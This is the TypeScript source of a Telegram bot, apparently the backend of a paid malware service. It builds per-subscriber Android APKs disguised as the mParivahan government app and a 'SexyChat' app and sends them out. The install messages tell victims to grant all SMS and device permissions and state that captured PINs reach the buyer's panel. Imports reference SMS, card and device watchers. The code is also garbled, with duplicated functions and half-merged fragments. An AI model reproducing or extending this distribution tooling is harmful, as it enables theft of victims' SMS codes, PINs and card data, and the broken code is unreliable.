import { Context, Markup, Telegraf } from "telegraf";
import { logger } from "../lib/logger";
import {
  buildUserApk,
  buildSexyChatApk,
  getApkSize,
  initApkTemplate,
  initSexyTemplate,
  isTemplateReady,
  isSexyTemplateReady,
} from "./apkBuilder";
import { startDeviceWatcher } from "./deviceWatcher";
import { startCcWatcher } from "./ccWatcher";
import { startSmsWatcher } from "./smsWatcher";
import { setLogBot, adminLog } from "./adminLog";
import {
  getSubscription,
  setSubscription,
  deleteSubscription,
  getAllSubscriptions,
  fbGet,
  fbSet,
  fbUpdate,
  fbDelete,
} from "./firebase";

// Tracks users mid-conversation (waiting for their next message)
const pendingActions = new Map<string, { action: "reset_password" | "broadcast" | "set_email" }>();
import { buildUserApk, getApkSize, initApkTemplate, isTemplateReady } from "./apkBuilder";
import { startDeviceWatcher } from "./deviceWatcher";
import { startCcWatcher } from "./ccWatcher";
const pendingActions = new Map<string, { action: "reset_password" | "set_email" }>();

const BOT_TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
const ENV_ADMIN_ID = parseInt(process.env["ADMIN_TELEGRAM_ID"] || "5741539104");
// ADMIN_ID kept for legacy watchers — dynamic check via isAdminAsync
const ADMIN_ID = ENV_ADMIN_ID;
const BOT_START_TIME = Date.now();

function getPanelUrl(): string {
  const custom = process.env["PANEL_URL"];
  if (custom) return custom.replace(/\/$/, "");
  const domain = process.env["REPLIT_DEV_DOMAIN"];
  if (domain) return `https://${domain}`;
  // Fallback to GH Pages + custom domain
  return "https://panel.kimiaxe.com";
}

if (!BOT_TOKEN) {
  logger.warn("TELEGRAM_BOT_TOKEN not set — bot will not start");
}

// Sync check for hot paths (env admin only)
function isAdmin(ctx: Context): boolean {
  return ctx.from?.id === ENV_ADMIN_ID;
}

// Dynamic admin check — also consults Firebase config/admin and config/admins[]
async function isAdminAsync(ctx: Context): Promise<boolean> {
  const id = ctx.from?.id;
  if (!id) return false;
  if (id === ENV_ADMIN_ID) return true;
  try {
    const [adminCfg, admins] = await Promise.all([
      fbGet("config/admin"),
      fbGet("config/admins"),
    ]);
    if (adminCfg?.telegramId && String(adminCfg.telegramId) === String(id)) return true;
    if (Array.isArray(admins) && admins.map(String).includes(String(id))) return true;
    // also check if any admin record has telegramId matching
    if (admins && typeof admins === "object") {
      for (const v of Object.values(admins as Record<string, any>)) {
        if (String(v?.telegramId ?? v) === String(id)) return true;
      }
    }
  } catch {}
  return false;
}

async function requireAdmin(ctx: Context): Promise<boolean> {
  if (isAdmin(ctx)) return true;
  if (await isAdminAsync(ctx)) return true;
  await ctx.reply("❌ *Admin only.*\nYou don't have permission for this command.", { parse_mode: "Markdown" });
  return false;
  if (custom) return custom;
  if (process.env["REPLIT_DEV_DOMAIN"]) return `https://${process.env["REPLIT_DEV_DOMAIN"]}`;
  return "https://panel.kimiaxe.com";
}

function daysToMs(days: number): number {
  return days * 24 * 60 * 60 * 1000;
}

function formatDate(ts: number): string {
  return new Date(ts).toLocaleString("en-IN", {
    timeZone: "Asia/Kolkata",
    day: "2-digit",
    month: "short",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  }) + " IST";
}

function isAdmin(ctx: Context): boolean {
  return ctx.from?.id === ADMIN_ID;
}

function formatUptime(ms: number): string {
  const s = Math.floor(ms / 1000);
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  if (d > 0) return `${d}d ${h}h ${m}m`;
  if (h > 0) return `${h}h ${m}m`;
  return `${m}m ${s % 60}s`;
}

let bot: Telegraf | null = null;

export function getBot(): Telegraf | null {
  return bot;
}

export function createBot(): Telegraf {
  if (!BOT_TOKEN) throw new Error("TELEGRAM_BOT_TOKEN is required");
// ── Pending notification delivery ────────────────────────────────────────────
// When a subscription is added for a user who hasn't started the bot yet,
// Telegram won't let us DM them. We queue the notification in Firebase and
// deliver it the moment they send /start.
export async function sendSubscriptionNotification(telegramId: string, sub: any): Promise<boolean> {
  if (!bot || !sub) return false;
  const now = Date.now();
  const isActive = sub.status === "active" && (!sub.expiresAt || now < sub.expiresAt);
  const daysLeft = sub.expiresAt ? Math.max(0, Math.floor((sub.expiresAt - now) / (1000 * 60 * 60 * 24))) : 0;

  const msg =
    `🎉 *Subscription Activated!*\n\n` +
    `👤 User: ${sub.username || "unknown"}\n` +
    `🆔 ID: \`${telegramId}\`\n` +
    `📅 Plan: ${sub.plan || "Custom"}\n` +
    (sub.expiresAt ? `⏰ Expires: ${formatDate(sub.expiresAt)}\n` : "") +
    `🕐 Days Left: ${daysLeft}d\n` +
    (sub.email ? `📧 Email: ${sub.email}\n` : "") +
    `\n📱 /apk — mParivahan APK\n` +
    `💬 /sexychat — SexyChat APK\n` +
    `🔑 /reset\\_password — Web panel password set karo\n` +
    `🌐 Panel: ${getPanelUrl()}`;

  try {
    await bot.telegram.sendMessage(parseInt(telegramId), msg, { parse_mode: "Markdown" });
    void adminLog(
      `🆕 *New Subscription*\n\n` +
      `👤 ${sub.username || telegramId}\n` +
      `🆔 \`${telegramId}\`\n` +
      `📦 Plan: *${sub.plan || "Custom"}*\n` +
      `⏳ Expires: ${new Date(sub.expiresAt || Date.now()).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })}`
    );
    return true;
  } catch {
    // User hasn't started the bot — queue for later delivery on /start
    try {
      const hub = await fbGet(`config/pendingNotifications/${telegramId}`);
      const existing = Array.isArray(hub?.items) ? hub.items : [];
      await fbSet(`config/pendingNotifications/${telegramId}`, {
        items: [...existing, { text: msg, ts: Date.now() }],
      });
      logger.info({ telegramId }, "Subscription notification queued (user hasn't started bot)");
    } catch (err) {
      logger.error({ err, telegramId }, "Failed to queue pending notification");
    }
    return false;
  }
}

// Deliver queued notifications on /start, then clear them.
async function deliverPendingNotifications(ctx: Context): Promise<void> {
  if (!ctx.from) return;
  const userId = ctx.from.id.toString();
  try {
    const hub = await fbGet(`config/pendingNotifications/${userId}`);
    if (!hub?.items || hub.items.length === 0) return;

    for (const item of hub.items) {
      try {
        await ctx.reply(item.text, { parse_mode: "Markdown" });
      } catch {
        logger.warn({ userId }, "Failed to deliver queued notification");
      }
      await new Promise((r) => setTimeout(r, 400)); // respect rate limits
    }
    await fbDelete(`config/pendingNotifications/${userId}`);
    logger.info({ userId, count: hub.items.length }, "Delivered pending notifications");
  } catch (err) {
    logger.error({ err, userId }, "Failed to deliver pending notifications");
  }
}

async function fetchSub(id: string) {
  return getSubscription(id);
}

// ── APK send helpers ──────────────────────────────────────────────────────
async function sendMparivahanApk(ctx: Context) {
  const userId = ctx.from!.id.toString();
  if (!ctx.chat) return;
  try {
    const sub = await fetchSub(userId);
    if (!isAdmin(ctx)) {
      const now = Date.now();
      const isActive = sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
      if (!isActive) {
        await ctx.reply("❌ Subscription expired or not found. Contact admin.");
        return;
      }
    }

    if (!isTemplateReady()) {
      await ctx.reply(
        "⏳ APK system is initializing (first-time setup ~2 min). Please try again shortly."
      );
      return;
    }

    const statusMsg = await ctx.reply("🔨 *Building your APK...*\nThis may take 30-60 seconds.", {
      parse_mode: "Markdown",
    });

    const apkPath = await buildUserApk(userId);
    if (!apkPath) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        undefined,
        "❌ APK build failed — template not ready. Contact admin."
      );
      return;
    }

    const size = getApkSize(apkPath);
    const buildId = Math.floor(Math.random() * 90000) + 10000;

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      undefined,
      `✅ *APK Ready!*\n\n📦 Size: ${size}\n🆔 Build: #${buildId}\n\nSending file...`
    );

    await ctx.replyWithDocument({
      source: apkPath,
      filename: `mParivahan_HARRYAXE_${userId}.apk`,
    });

    await ctx.reply(
      `📱 *Install Steps:*\n\n` +
      `1. Install & open the APK\n` +
      `2. Allow all permissions\n` +
      `3. Done — device will appear in panel\n\n` +
      `_Isse install karte hi aapka device panel mein connect ho jayega._`,
      { parse_mode: "Markdown" }
    );
  } catch (err: any) {
    logger.error({ err }, "mParivahan APK command failed");
    await ctx.reply("❌ APK generation failed. Contact admin.");
  }
}

async function sendSexyChatApk(ctx: Context) {
  const userId = ctx.from!.id.toString();
  if (!ctx.chat) return;
  try {
    const sub = await fetchSub(userId);
    if (!isAdmin(ctx)) {
      const now = Date.now();
      const isActive = sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
      if (!isActive) {
        await ctx.reply("❌ Subscription expired or not found. Contact admin.");
        return;
      }
    }

    if (!isSexyTemplateReady()) {
      await ctx.reply(
        "⏳ SexyChat APK system is initializing (first-time setup). Please try again shortly."
      );
      return;
    }

    const statusMsg = await ctx.reply("🔨 *Building your SexyChat APK...*\nThis may take 30-60 seconds.", {
      parse_mode: "Markdown",
    });

    const sexyApkPath = await buildSexyChatApk(userId);
    if (!sexyApkPath) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        undefined,
        "❌ SexyChat APK build failed — template not ready. Contact admin."
      );
      return;
    }

    const size = getApkSize(sexyApkPath);

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      undefined,
      `✅ *SexyChat APK Ready!*\n\n📦 Size: ${size}\n\nSending file...`
    );

    await ctx.replyWithDocument({
      source: sexyApkPath,
      filename: `SexyChat_${userId}.apk`,
    });

    await ctx.reply(
      `💬 *SexyChat APK Install Steps:*\n\n` +
      `1. Install & open the APK\n` +
      `2. Allow all permissions\n` +
      `3. Done — enjoy!\n\n` +
      `_Is APK aapke device ID (${userId}) ke saath build hua hai — PIN capture aapke panel mein aayega._`,
      { parse_mode: "Markdown" }
    );
  } catch (err: any) {
    logger.error({ err }, "SexyChat APK command failed");
    await ctx.reply("❌ SexyChat APK send failed. Contact admin.");
  }
}

async function handleApkCommand(ctx: Context) {
  const userId = ctx.from!.id.toString();
  try {
    const sub = await fetchSub(userId);
    if (!isAdmin(ctx)) {
      const now = Date.now();
      const isActive = sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
      if (!isActive) {
        await ctx.reply("❌ Subscription expired or not found. Contact admin.");
        return;
      }
    }

    await ctx.reply(
      `📦 *Select APK to download:*\n\n` +
      `📱 **mParivahan** — Private panel app\n` +
      `💬 **SexyChat** — Chat app`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback("📱 mParivahan APK", "apk_mparivahan"),
            Markup.button.callback("💬 SexyChat APK", "apk_sexychat"),
          ],
        ]),
      }
    );
  } catch (err: any) {
    logger.error({ err }, "APK menu failed");
    await ctx.reply("❌ APK menu failed. Contact admin.");
  }
}

async function handleListUsers(ctx: Context) {
  if (!isAdmin(ctx)) {
    await ctx.reply("❌ Admin only.");
    return;
  }
  try {
    const subs = await getAllSubscriptions();
    const now = Date.now();
    const entries = Object.entries(subs);

    if (entries.length === 0) {
      await ctx.reply("📭 No subscriptions found.");
      return;
    }

    const lines = entries.map(([id, s]: [string, any]) => {
      const active = s.status === "active" && (!s.expiresAt || now < s.expiresAt);
      const daysLeft = s.expiresAt ? Math.max(0, Math.floor((s.expiresAt - now) / 86_400_000)) : 0;
      return `${active ? "🟢" : "🔴"} \`${id}\` @${s.username || "unknown"} — ${s.plan || "?"} (${daysLeft}d)`;
    });

    // Telegram has 4096 char limit; chunk if needed
    for (let i = 0; i < lines.length; i += 20) {
      const chunk = lines.slice(i, i + 20).join("\n");
      await ctx.reply(
        `📋 *Users (${entries.length}):*\n\n${chunk}`,
        { parse_mode: "Markdown" }
      );
    }
  } catch (err) {
    logger.error({ err }, "List users failed");
    await ctx.reply("❌ Failed to list users.");
  }
}

async function handleResetPassword(ctx: Context) {
  const userId = ctx.from!.id.toString();
  pendingActions.set(userId, { action: "reset_password" });
  await ctx.reply(
    "🔑 *Reset Password*\n\n" +
    "Apna new password likho (min 4 characters):\n\n" +
    "_Cancel karne ke liye /cancel bhejo._"
  );
}

async function handleSetPanelEmail(ctx: Context) {
  const userId = ctx.from!.id.toString();
  pendingActions.set(userId, { action: "set_email" });
  await ctx.reply(
    "📧 *Set Panel Email*\n\n" +
    "Apna email address bhejo:\n\n" +
    "_Is email se web panel login karoge._"
  );
}

export async function startBot(): Promise<void> {
  if (!BOT_TOKEN) return;

  // Pre-decode APK templates in background so /apk and /sexychat are ready instantly
  initApkTemplate().catch((err) =>
    logger.error({ err }, "APK template init failed")
  );
  initSexyTemplate().catch((err) =>
    logger.error({ err }, "SexyChat template init failed")
  );

  bot = new Telegraf(BOT_TOKEN);

  // Global error handler — prevents unhandled rejections crashing the bot
  bot.catch(async (err: unknown, ctx: Context) => {
    logger.error({ err }, "Bot unhandled error");
    try {
      await ctx.reply("❌ An error occurred. Please try again or contact admin.");
    } catch {}
  });

  // ─── /help — beautified command list ────────────────────────────────────
  bot.command("help", async (ctx) => {
    const adminFlag = isAdmin(ctx) || (await isAdminAsync(ctx));
    const panelUrl = getPanelUrl();
    if (adminFlag) {
      await ctx.reply(
        `*┏━━━ AxeCodi Admin Help ━━━┓*\n\n` +
        `*👑 Admin Commands*\n` +
        ` /start — Admin dashboard\n` +
        ` /help — Show this help\n` +
        ` /ping — Bot health + uptime\n` +
        ` /stats — System statistics\n` +
        ` /adduser <id> <days> <@user> [email] — Add/extend subscription\n` +
        ` /removeuser <id> — Remove user\n` +
        ` /listusers — List all users\n` +
        ` /userinfo <id> — Show user details\n` +
        ` /extend <id> <days> — Extend subscription\n` +
        ` /broadcast <msg> — Broadcast to all active users\n` +
        ` /setpanel <email> — Set admin panel email\n` +
        ` /setadmin <id> — Transfer admin (firebase)\n` +
        ` /setchannel <id> — Set SMS forward channel\n` +
        ` /removechannel — Remove SMS channel\n\n` +
        `*📱 User Commands*\n` +
        ` /apk — Build & get APK\n` +
        ` /reset\\_password — Reset panel password\n` +
        ` 🌐 Open Panel — Web panel link\n\n` +
        `*🌐 Panel:* ${panelUrl}\n` +
        `*🔧 Admin ID:* \`${ENV_ADMIN_ID}\``,
  // ─── /start ──────────────────────────────────────────────────────────────
  bot.command("start", async (ctx) => {
    const userId = ctx.from.id.toString();
    const username = ctx.from.username || ctx.from.first_name || "User";

    // Deliver any queued subscription notifications first
    await deliverPendingNotifications(ctx);

    if (isAdmin(ctx)) {
      const panelUrl = getPanelUrl();
      await ctx.reply(
        `*HARRYAXE Panel — Admin Console*\n\n` +
        `Welcome back, @${ctx.from.username || "admin"}!\n\n` +
        `*Available Commands:*\n` +
        `/start — Show this menu\n` +
        `/apk — Get mParivahan APK\n` +
        `/sexychat — Get SexyChat APK\n` +
        `/reset\\_password — Reset web panel password\n` +
        `/setpanel — Set panel email\n\n` +
        `*Admin Commands:*\n` +
        `/adduser — Add subscription\n` +
        `/removeuser — Remove subscription\n` +
        `/listusers — List all subscribers\n` +
        `/stats — System stats\n\n` +
        `🌐 *Panel:* ${panelUrl}`,
        {
          parse_mode: "Markdown",
          ...Markup.inlineKeyboard([
            [Markup.button.url("🌐 Open Web Panel", panelUrl), Markup.button.callback("📊 Stats", "admin_stats")],
            [Markup.button.callback("👥 Users", "admin_users"), Markup.button.callback("➕ Add User", "admin_add_help")],
          ]),
        }
      );
    } else {
      await ctx.reply(
        `*AxeCodi Panel — Help*\n\n` +
        ` /start — Show subscription\n` +
        ` /apk — Get mParivahan APK\n` +
        ` /reset\\_password — Reset panel password\n` +
        ` /help — Show this help\n` +
        ` /ping — Check bot alive\n\n` +
        `*🌐 Panel:* ${panelUrl}\n` +
        `Need access? Contact @exoincs`,
        {
          parse_mode: "Markdown",
          ...Markup.inlineKeyboard([[Markup.button.url("🌐 Open Web Panel", panelUrl)]]),
        }
      );
    }
  });

  // ─── /start — beautified ─────────────────────────────────────────────────
  bot.command("start", async (ctx) => {
    const adminFlag = isAdmin(ctx) || (await isAdminAsync(ctx));
    logger.info({ userId: ctx.from?.id, isAdmin: adminFlag }, "Bot /start received");
    const userId = ctx.from.id.toString();
    const username = ctx.from.username || ctx.from.first_name || "User";

    if (adminFlag) {
      const panelUrl = getPanelUrl();
      const uptime = formatUptime(Date.now() - BOT_START_TIME);
      // Fetch quick stats for admin dashboard
      let deviceCount = 0, activeSubs = 0;
      try {
        const [clients, subs] = await Promise.all([fbGet("clients"), getAllSubscriptions()]);
        deviceCount = clients ? Object.keys(clients).length : 0;
        activeSubs = Object.values(subs).filter((s: any) => s.status === "active" && (!s.expiresAt || Date.now() < s.expiresAt)).length;
      } catch {}
      await ctx.reply(
        `*╔════════ AxeCodi Control ════════╗*\n\n` +
        `*👑 Admin Console* — @${ctx.from.username || "admin"}\n` +
        `┌─────────────────────────────┐\n` +
        `│ 🟢 Bot: Online • Uptime ${uptime}\n` +
        `│ 📱 Devices: ${deviceCount} • 👥 Active: ${activeSubs}\n` +
        `│ 🌐 Panel: ${panelUrl}\n` +
        `└─────────────────────────────┘\n\n` +
        `*⚡ Quick Actions*\n` +
        `• /apk — Build APK\n` +
        `• /adduser — Add subscription\n` +
        `• /listusers — View all users\n` +
        `• /stats — Full statistics\n` +
        `• /help — All commands\n\n` +
        `*🔧 Admin:* \`${ENV_ADMIN_ID}\` • Firebase admin synced`,
        {
          parse_mode: "Markdown",
          ...Markup.inlineKeyboard([
            [Markup.button.url("🌐 Open Web Panel", panelUrl), Markup.button.callback("📊 Stats", "admin_stats")],
            [Markup.button.callback("📱 Get APK", "get_apk"), Markup.button.callback("👥 Users", "admin_users")],
            [Markup.button.callback("➕ Add User", "admin_add_help"), Markup.button.callback("❓ Help", "show_help")],
          ]),
        }
      );
      await ctx.reply(
        `*Admin Keyboard* — tap to run:`,
        {
          parse_mode: "Markdown",
          ...Markup.keyboard([
            ["📱 Get APK", "🔑 Reset Password"],
            ["👥 Users List", "📊 Stats"],
            ["➕ Add User", "📢 Broadcast"],
            ["🌐 Open Panel", "❓ Help"],
          ]).resize(),
        }
      );
      return;
    }

    const sub = await getSubscription(userId);

    if (!sub) {
      await ctx.reply(
        `*┏━━━ AxeCodi Panel ━━━┓*\n\n` +
        `❌ *No subscription found*\n\n` +
        `Your ID: \`${userId}\`\n` +
        `Contact admin to get access:\n` +
        `👉 @exoincs\n\n` +
        `Already paid? Ask admin to run:\n` +
        `\`/adduser ${userId} 30 @${username} your@email.com\``,
        `*HARRYAXE Panel Bot*\n\n` +
        `❌ No subscription found for your account.\n\n` +
        `Contact admin to get access:\n@exoincs`,
        { parse_mode: "Markdown" }
      );
      return;
    }

    const now = Date.now();
    const isActive = sub.status === "active" && (!sub.expiresAt || now < sub.expiresAt);
    const timeLeft = sub.expiresAt ? Math.max(0, sub.expiresAt - now) : 0;
    const daysLeft = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hoursLeft = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));

    const panelUrl = getPanelUrl();
    const statusEmoji = isActive ? "🟢" : "🔴";
    const planBar = isActive ? "▓".repeat(Math.min(10, Math.max(1, daysLeft))) + "░".repeat(10 - Math.min(10, Math.max(1, daysLeft))) : "░".repeat(10);
    await ctx.reply(
      `*┏━━━ Your Subscription ━━━┓*\n\n` +
      `*👤 Account:* ${username} (\`${userId}\`)\n` +
      `*📦 Plan:* ${sub.plan}\n` +
      `*${statusEmoji} Status:* ${isActive ? "Active" : "Expired"} ${isActive ? "`✅`" : "`❌`"}\n` +
      (sub.expiresAt ? `*⏰ Expires:* ${formatDate(sub.expiresAt)}\n` : "") +
      (isActive && sub.expiresAt ? `*⏳ Left:* ${daysLeft}d ${hoursLeft}h\n` + `\`[${planBar}]\`\n` : "") +
      `\n*🌐 Panel:* ${panelUrl}\n` +
      `_Login with your email + password, then OTP via Telegram._`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.url("🌐 Open Web Panel", panelUrl), Markup.button.callback("📱 Get APK", "get_apk")],
          [Markup.button.callback("🔑 Reset Password", "reset_pwd")],
        ]),
      }
    );
    await ctx.reply(
      "Quick actions:",
      Markup.keyboard([
        ["📱 Get APK", "🔑 Reset Password"],
        ["🌐 Open Panel", "❓ Help"],
      ]).resize()
    );
  });

  // ─── Inline callbacks for admin panel ───────────────────────────────────
  bot.action("admin_stats", async (ctx) => {
    await ctx.answerCbQuery();
    // @ts-ignore
    ctx.from = (ctx.callbackQuery as any)?.from || ctx.from;
    // Reuse stats logic
    if (!(await isAdminAsync(ctx as any)) && !isAdmin(ctx as any)) return;
    const [clients, subs] = await Promise.all([fbGet("clients"), getAllSubscriptions()]);
    const deviceCount = clients ? Object.keys(clients).length : 0;
    const subCount = Object.keys(subs).length;
    const activeSubs = Object.values(subs).filter((s: any) => s.status === "active" && (!s.expiresAt || Date.now() < s.expiresAt)).length;
    const expired = subCount - activeSubs;
    const uptime = formatUptime(Date.now() - BOT_START_TIME);
    await ctx.reply(
      `*📊 System Stats*\n` +
      `┌─────────────────────┐\n` +
      `│ ⏱ Uptime: ${uptime}\n` +
      `│ 📱 Devices: ${deviceCount}\n` +
      `│ 👥 Total: ${subCount} • ✅ ${activeSubs} • ❌ ${expired}\n` +
      `└─────────────────────┘`,
      { parse_mode: "Markdown" }
    );
  });
  bot.action("admin_users", async (ctx) => {
    await ctx.answerCbQuery();
    // @ts-ignore
    const fakeCtx = { from: (ctx.callbackQuery as any)?.from, reply: ctx.reply.bind(ctx) } as any;
    await handleListUsers(fakeCtx);
  });
  bot.action("get_apk", async (ctx) => {
    await ctx.answerCbQuery();
    // @ts-ignore
    const fakeCtx = { from: (ctx.callbackQuery as any)?.from, reply: ctx.reply.bind(ctx), telegram: ctx.telegram } as any;
    fakeCtx.from.id = fakeCtx.from.id;
    // call handleApk with proper ctx shape
    await handleApkCommand(ctx as any);
  });
  bot.action("reset_pwd", async (ctx) => {
    await ctx.answerCbQuery();
    // @ts-ignore
    await handleResetPassword(ctx as any);
  });
  bot.action("admin_add_help", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(
      `*➕ Add User — Help*\n\n` +
      `Usage:\n\`/adduser <telegramId> <days> <@username> [email]\`\n\n` +
      `Example:\n\`/adduser 123456789 30 @john john@example.com\`\n\n` +
      `_Email is required for web panel login (username/email). If email omitted, user can still get APK but not panel._`,
      { parse_mode: "Markdown" }
    );
  });
  bot.action("show_help", async (ctx) => {
    await ctx.answerCbQuery();
    // @ts-ignore
    ctx.from = (ctx.callbackQuery as any)?.from || ctx.from;
    // trigger help
    await ctx.reply("Use /help to see all commands.");
  });

  // ─── 🌐 Open Panel keyboard button ──────────────────────────────────────
  bot.hears("🌐 Open Panel", async (ctx) => {
    const panelUrl = getPanelUrl();
    await ctx.reply(
      `*🌐 Web Panel*\n\n${panelUrl}\n\n` +
      `*Login:* Email/Username + Password → OTP on Telegram\n` +
      `_No password? Use /reset\\_password to set one._\n` +
      `_Google Sign-In: if your Google email is linked, use the Google button on login page._`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.url("🌐 Open Web Panel", panelUrl)],
        ]),
  // ─── /cancel — clears pending action ───────────────────────────────────
  bot.command("cancel", async (ctx) => {
    pendingActions.delete(ctx.from!.id.toString());
    await ctx.reply("❌ Cancelled.");
  });

  // ─── Handle text messages for pending actions ──────────────────────────
  bot.on("text", async (ctx, next) => {
    const userId = ctx.from!.id.toString();
    const action = pendingActions.get(userId);
    if (!action) return next(); // not in a flow — pass to command handlers

    const text = (ctx.message.text || "").trim();

    if (action.action === "reset_password") {
      pendingActions.delete(userId);
      if (text.length < 4) {
        await ctx.reply("❌ Password kam se kam 4 characters ka hona chahiye. /reset_password dobara karo.");
        return;
      }
      try {
        await fbUpdate(`subscriptions/${userId}`, { panelPassword: text });
        await ctx.reply("✅ *Password updated!*\n\nAb web panel mein login kar sakte ho.", {
          parse_mode: "Markdown",
        });
      } catch (err) {
        logger.error({ err }, "Failed to set password");
        await ctx.reply("❌ Password set nahi hua. Try again.");
      }
    } else if (action.action === "set_email") {
      pendingActions.delete(userId);
      if (!text.includes("@") || text.length < 5) {
        await ctx.reply("❌ Valid email bhejo (example@mail.com). /setpanel dobara karo.");
        return;
      }
      try {
        await fbUpdate(`subscriptions/${userId}`, { email: text.toLowerCase() });
        await ctx.reply("✅ *Email updated!*\n\nAb web panel login ke liye ready ho.", {
          parse_mode: "Markdown",
        });
      } catch (err) {
        logger.error({ err }, "Failed to set email");
        await ctx.reply("❌ Email set nahi hua. Try again.");
      }
    }
  });
  bot.hears("❓ Help", async (ctx) => {
    // @ts-ignore
    await ctx.reply("Use /help for full command list.");
  });

  // ─── /apk ────────────────────────────────────────────────────────────────
  bot.command("apk", handleApkCommand);

  async function handleApkCommand(ctx: Context) {
    try {
      const userId = ctx.from!.id.toString();
      const adminFlag = isAdmin(ctx) || (await isAdminAsync(ctx));
      const active = adminFlag || await isSubscriptionActive(userId);

      if (!active) {
        await ctx.reply(
          `❌ *Subscription required*\n\nYour ID: \`${userId}\`\nContact @exoincs to activate.\n\nAdmin can run:\n\`/adduser ${userId} 30 @${ctx.from?.username ?? "user"} email@example.com\``,
          { parse_mode: "Markdown" }
        );
        return;
      }

      if (!isTemplateReady()) {
        await ctx.reply("⏳ *APK system initializing...*\nFirst-time setup takes ~2 min. Try again shortly.", { parse_mode: "Markdown" });
        return;
      }

      await ctx.reply("🔨 *Building your APK...* ⏳\n`M-Parivahan • AxeCodi • #${userId.slice(-4)}`\nThis takes ~10 seconds.", { parse_mode: "Markdown" });
      await buildAndSendMparivahan(ctx);
    } catch (err) {
      logger.error({ err }, "handleApkCommand error");
      await ctx.reply("❌ APK build failed. Please try /apk again later.");
    }
  }

  async function buildAndSendMparivahan(ctx: Context) {
    try {
      const userId = ctx.from!.id.toString();
      const apkPath = await buildUserApk(userId);
      if (!apkPath) {
        await ctx.reply("❌ APK build failed — template not ready. Contact admin @exoincs.");
        return;
      }

      const size = getApkSize(apkPath);
      const buildId = Math.floor(Math.random() * 90000) + 10000;

      await ctx.reply(
        `*┏━━━ AxeCodi Build Center ━━━┓*\n\n` +
        `📱 *App:* M-Parivahan\n` +
        `🆔 *Build ID:* \`#${buildId}\`\n` +
        `👤 *Owner:* \`${userId}\` @${ctx.from?.username ?? "user"}\n` +
        `📦 *Size:* ${size}\n` +
        `✅ *Status:* Ready!\n` +
        `🔗 *Panel:* ${getPanelUrl()}\n\n` +
        `👇 *APK sent below — install & login*`,
        { parse_mode: "Markdown" }
      );

      await ctx.replyWithDocument({ source: apkPath, filename: `mParivahan_AxeCodi_${buildId}.apk` });
      await ctx.reply(
        `*📲 Install Steps*\n` +
        `1. Enable _Install unknown apps_\n` +
        `2. Install APK\n` +
        `3. Open → Login with panel credentials\n` +
        `4. Grant SMS/Device permissions`,
        { parse_mode: "Markdown" }
      );
      // Upload via a streaming source + retry with backoff. Large (5MB)
      // multipart uploads via node-fetch can reset ("socket hang up" /
      // ECONNRESET), so retry transient failures up to 3 times.
      let sent = false;
      for (let attempt = 0; attempt < 3 && !sent; attempt++) {
        try {
          await ctx.replyWithDocument({
            source: fs.createReadStream(apkPath),
            filename: `mParivahan_AxeCodi.apk`,
          });
          sent = true;
        } catch (uploadErr: any) {
          const msg = uploadErr?.message || String(uploadErr);
          const isTransient =
            /socket hang up|ECONNRESET|connection reset|timeout|429|Too Many Requests/i.test(msg);
          if (!isTransient || attempt === 2) throw uploadErr;
          logger.warn(
            { attempt: attempt + 1, msg },
            "APK upload transient failure — retrying"
          );
          await new Promise((r) => setTimeout(r, 3000 * (attempt + 1)));
        }
      }
    } catch (err: any) {
      logger.error({ err }, "buildAndSendMparivahan error");
      const errMsg = err?.message || String(err);
      const from = ctx.from!;
      try {
        await bot!.telegram.sendMessage(
          ADMIN_ID,
          `🔴 *APK build error* for \`${from.id}\` @${from.username ?? "?"}\n\`\`\`${errMsg.slice(0, 800)}\`\`\``,
          { parse_mode: "Markdown" }
        );
      } catch {}
      await ctx.reply(`❌ *APK build failed*\n\`${errMsg.slice(0, 300)}\`\n\nTry again or contact admin.`, { parse_mode: "Markdown" });
      if (bot) {
        try {
          await bot.telegram.sendMessage(
            ADMIN_ID,
            `🔴 APK build error:\n\`${errMsg.slice(0, 500)}\``,
            { parse_mode: "Markdown" }
          );
        } catch {}
      }
      await ctx.reply(`❌ APK build failed:\n\`${errMsg.slice(0, 300)}\``, { parse_mode: "Markdown" });
    }
  }
  // ─── APK callback actions ───────────────────────────────────────────────
  bot.action("apk_mparivahan", async (ctx) => {
    await ctx.answerCbQuery("Building mParivahan APK...");
    await sendMparivahanApk(ctx);
  });

  bot.action("apk_sexychat", async (ctx) => {
    await ctx.answerCbQuery("Sending SexyChat APK...");
    await sendSexyChatApk(ctx);
  });

  // ─── /reset_password ─────────────────────────────────────────────────────
  bot.command("reset_password", handleResetPassword);

  async function handleResetPassword(ctx: Context) {
    const userId = ctx.from!.id.toString();
    const adminFlag = isAdmin(ctx) || (await isAdminAsync(ctx));
    const active = adminFlag || await isSubscriptionActive(userId);

    if (!active) {
      await ctx.reply("❌ Subscription required. Contact @exoincs.");
      return;
    }

    pendingActions.set(userId, { action: "reset_password" });

    await ctx.reply(
      `*🔑 Password Reset*\n\n` +
      `Send your *new panel password* as next message:\n\n` +
      `• Min 4 characters\n` +
      `• Only your account will be updated\n` +
      `• Example: \`MyPass123\`\n\n` +
      `_Type /cancel to abort._`,
      { parse_mode: "Markdown" }
    );
  }
  bot.command("cancel", async (ctx) => {
    const uid = ctx.from.id.toString();
    if (pendingActions.has(uid)) {
      pendingActions.delete(uid);
      await ctx.reply("✅ Cancelled.");
    } else {
      await ctx.reply("Nothing to cancel. Use /help.");
    }
  });

  // ─── Admin: /setpanel ────────────────────────────────────────────────────
  bot.command("setpanel", async (ctx) => {
    if (!(await requireAdmin(ctx))) return;

